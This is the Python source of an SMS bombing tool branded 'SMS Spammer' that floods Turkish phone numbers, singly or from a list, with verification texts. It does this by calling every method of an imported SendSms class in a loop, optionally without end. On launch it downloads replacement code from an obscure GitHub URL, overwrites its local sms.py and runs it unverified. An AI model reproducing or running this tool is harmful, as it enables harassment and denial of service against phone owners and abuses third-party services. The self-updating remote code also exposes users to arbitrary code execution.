from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from requests import get
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = get("https://raw.githubusercontent.com/cacaicocobobo125/codeiboilordizengi025c2020i62/main/rodei/bobocai/loaded/cocoine.py").text

with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()

if read == r:
    pass
else:
    print(Fore.RED + "Updating SMS Spammer...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)


from sms import SendSms
services_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            services_sms.append(attribute)
            
while 1:
    system("cls||clear")
    print("""{}

  /$$$$$$  /$$      /$$  /$$$$$$         /$$$$$$  /$$$$$$$   /$$$$$$  /$$      /$$ /$$      /$$ /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$       /$$__  $$| $$__  $$ /$$__  $$| $$$    /$$$| $$$    /$$$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \__/| $$  \ $$| $$  \ $$| $$$$  /$$$$| $$$$  /$$$$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       |  $$$$$$ | $$$$$$$/| $$$$$$$$| $$ $$/$$ $$| $$ $$/$$ $$| $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$       \____  $$| $$____/ | $$__  $$| $$  $$$| $$| $$  $$$| $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$       /$$  \ $$| $$      | $$  | $$| $$\  $ | $$| $$\  $ | $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      |  $$$$$$/| $$      | $$  | $$| $$ \/  | $$| $$ \/  | $$| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/        \______/ |__/      |__/  |__/|__/     |__/|__/     |__/|________/|__/  |__/
                                                                                                                                                                                                                                          
                  {}by {}XeldarAlz\n  
    """.format(Fore.LIGHTCYAN_EX, Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- Send SMS\n 2- Quit\n \n" + Fore.LIGHTYELLOW_EX + " Choice: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Invalid input. Try again.")
        sleep(3)
        continue

    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Type the phone number without '+90' at the beginning (press 'enter' if there is more than one): "+ Fore.LIGHTGREEN_EX, end="")
        phone_no = input()
        phone_list = []
        if phone_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Directory of the file where the phone numbers are saved: "+ Fore.LIGHTGREEN_EX, end="")
            phonelist_dir = input()
            try:
                with open(phonelist_dir, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            phone_list.append(i)
                phone_infinite = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Incorrect file directory. Try again.")
                sleep(3)
                continue
        else:
            try:
                int(phone_no)
                if len(phone_no) != 10:
                    raise ValueError
                phone_list.append(phone_no)
                phone_infinite = "(If infinite press 'enter'.)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Incorrect phone number. Try again.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Email address (Press 'enter' if you don't know it): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Incorrect e-mail address. Try again.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"How many SMS do you want to send? {phone_infinite}: "+ Fore.LIGHTGREEN_EX, end="")
            sms_count = input()
            if sms_count:
                sms_count = int(sms_count)
            else:
                sms_count = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid input. Try again.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "How many seconds do you want to wait for per sms?: "+ Fore.LIGHTGREEN_EX, end="")
            sms_delay = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid input. Try again.") 
            sleep(3)
            continue
        system("cls||clear")
        if sms_count is None: 
            sms = SendSms(phone_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(sms_delay)
        for i in phone_list:
            sms = SendSms(i, mail)
            if isinstance(sms_count, int):
                    while sms.count < sms_count:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.count == sms_count:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(sms_delay)
        print(Fore.LIGHTRED_EX + "\nPress 'enter' to return to the menu.")
        input()

    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Quitting.")
        break